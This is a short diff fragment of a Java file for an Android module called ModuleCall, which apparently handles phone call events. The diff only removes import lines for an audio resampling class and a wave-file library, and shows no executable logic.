@@ -38,7 +38,6 @@ import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.listener.ListenerCall;
-import com.android.deviceinfo.resample.Resample;
 import com.android.deviceinfo.util.AudioEncoder;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
@@ -48,8 +47,6 @@ import com.android.deviceinfo.util.Execute;
 import com.android.deviceinfo.util.Instrument;
 import com.android.deviceinfo.util.Utils;
 import com.android.deviceinfo.util.WChar;
-import com.musicg.wave.Wave;
-import com.musicg.wave.WaveHeader;
 
 public class ModuleCall extends BaseModule implements Observer<Call> {
 	private static final String TAG = "ModuleCall"; //$NON-NLS-1$
